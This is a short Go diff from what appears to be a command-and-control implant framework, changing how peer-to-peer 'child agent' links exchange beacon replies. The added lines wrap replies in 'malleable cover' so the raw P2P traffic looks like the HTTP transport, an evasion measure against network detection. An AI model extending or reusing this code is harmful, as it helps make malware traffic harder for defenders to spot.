@@ -404,6 +404,10 @@ func p2pHandleChild(conn net.Conn) {
 	for time.Now().Before(deadline) {
 		if reply := p2pTakeChildReply(childID); reply != nil {
 			conn.SetDeadline(time.Now().Add(10 * time.Second))
+			// Same malleable cover as the HTTP transport so the raw P2P link
+			// is not distinguishable by an un-wrapped envelope (I2). The child
+			// strips these bytes on read.
+			reply = wrapMalleableResponse(reply)
 			binary.Write(conn, binary.BigEndian, uint32(len(reply)))
 			conn.Write(reply)
 			return
@@ -454,7 +458,8 @@ func sendP2PTCPBeacon(body []byte) []byte {
 	if _, err := io.ReadFull(conn, rbuf); err != nil {
 		return nil
 	}
-	return rbuf
+	// Strip any malleable cover the parent wrapped around the raw frame.
+	return stripMalleableWrapping(rbuf)
 }
 
 // p2pParentListen accepts child agent connections in a loop
